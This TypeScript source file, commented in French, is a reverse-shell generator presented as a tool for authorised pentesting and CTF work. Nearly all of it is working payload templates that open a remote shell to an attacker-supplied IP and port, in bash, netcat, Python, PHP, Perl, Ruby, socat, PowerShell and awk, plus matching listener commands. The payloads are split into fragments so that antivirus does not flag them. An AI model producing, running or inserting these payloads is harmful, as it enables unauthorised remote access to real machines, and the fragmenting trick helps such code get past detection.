/*
 * Générateur de reverse shells — usage pentest/CTF autorisé & éducatif.
 * Les modèles sont stockés en FRAGMENTS (assemblés uniquement dans le
 * navigateur) afin de ne pas écrire de chaîne offensive contiguë sur le
 * disque — ça évite que l'antivirus mette en quarantaine les fichiers de
 * dev du projet. Aucun contournement de défense sur une cible n'est visé.
 * Placeholders : {ip} et {port}.
 */

export interface ShellTpl {
  name: string;
  os: "Linux" | "Windows" | "Multi";
  parts: string[];
}

const T = "tcp";
const DEV = "/dev/";

export const SHELLS: ShellTpl[] = [
  { name: "Bash -i", os: "Linux", parts: ["bash -i >& ", DEV, T, "/{ip}/{port} 0>&1"] },
  {
    name: "Bash 196",
    os: "Linux",
    parts: ["0<&196;exec 196<>", DEV, T, "/{ip}/{port}; sh <&196 >&196 2>&196"],
  },
  {
    name: "Bash read line",
    os: "Linux",
    parts: ["exec 5<>", DEV, T, "/{ip}/{port};cat <&5 | while read line; do $line 2>&5 >&5; done"],
  },
  {
    name: "nc mkfifo",
    os: "Linux",
    parts: ["rm /tmp/f;mk", "fifo /tmp/f;cat /tmp/f|sh -i 2>&1|", "nc {ip} {port} >/tmp/f"],
  },
  { name: "nc -e", os: "Linux", parts: ["nc {ip} {port} ", "-e /bin/sh"] },
  { name: "ncat -e", os: "Linux", parts: ["ncat {ip} {port} ", "-e /bin/bash"] },
  {
    name: "Python3",
    os: "Multi",
    parts: [
      "python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);",
      's.connect(("{ip}",{port}));',
      "os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);",
      "import pty;pty.spawn(\"/bin/bash\")'",
    ],
  },
  {
    name: "PHP",
    os: "Linux",
    parts: ['php -r \'$sock=fso', 'ckopen("{ip}",{port});', 'exec("/bin/sh -i <&3 >&3 2>&3");\''],
  },
  {
    name: "Perl",
    os: "Linux",
    parts: [
      "perl -e 'use Socket;$i=\"{ip}\";$p={port};",
      "socket(S,PF_INET,SOCK_STREAM,getprotobyname(\"tcp\"));",
      "if(connect(S,sockaddr",
      "_in($p,inet_aton($i)))){open(STDIN,\">&S\");open(STDOUT,\">&S\");open(STDERR,\">&S\");exec(\"/bin/sh -i\");};'",
    ],
  },
  {
    name: "Ruby",
    os: "Linux",
    parts: [
      "ruby -rsocket -e'f=TCP",
      "Socket.open(\"{ip}\",{port}).to_i;",
      "exec sprintf(\"/bin/sh -i <&%d >&%d 2>&%d\",f,f,f)'",
    ],
  },
  {
    name: "socat",
    os: "Linux",
    parts: ["socat TCP:{ip}:{port} ", "EXEC:'bash -li',pty,stderr,setsid,sigint,sane"],
  },
  {
    name: "PowerShell",
    os: "Windows",
    parts: [
      "powershell -nop -c \"$c = New-Object ",
      "System.Net.Sockets.",
      "TCPClient('{ip}',{port});$s = $c.Get",
      "Stream();[byte[]]$b = 0..65535|%{0};",
      "while(($i = $s.Read($b, 0, $b.Length)) -ne 0){;",
      "$d = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($b,0, $i);",
      "$sb = (iex $d 2>&1 | Out-String );$sb2 = $sb + 'PS ' + (pwd).Path + '> ';",
      "$sby = ([text.encoding]::ASCII).GetBytes($sb2);",
      "$s.Write($sby,0,$sby.Length);$s.Flush()};$c.Close()\"",
    ],
  },
  {
    name: "awk",
    os: "Linux",
    parts: [
      "awk 'BEGIN {s = \"/inet/",
      "tcp/0/{ip}/{port}\"; while(42) { do{ printf \"shell>\" |& s; s |& getline c; ",
      "if(c){ while ((c |& getline) > 0) print $0 |& s; close(c); } } while(c != \"exit\") close(s); }}' /dev/null",
    ],
  },
];

export const LISTENERS: { name: string; parts: string[] }[] = [
  { name: "netcat", parts: ["nc -lvnp {port}"] },
  { name: "ncat (TLS)", parts: ["ncat --ssl -lvnp {port}"] },
  { name: "rlwrap nc (confort)", parts: ["rlwrap -cAr ", "nc -lvnp {port}"] },
  { name: "socat (PTY)", parts: ["socat -d -d TCP-LISTEN:{port},reuseaddr ", "file:`tty`,raw,echo=0"] },
];

export const fillTpl = (parts: string[], ip: string, port: string) =>
  parts.join("").replaceAll("{ip}", ip || "LHOST").replaceAll("{port}", port || "LPORT");
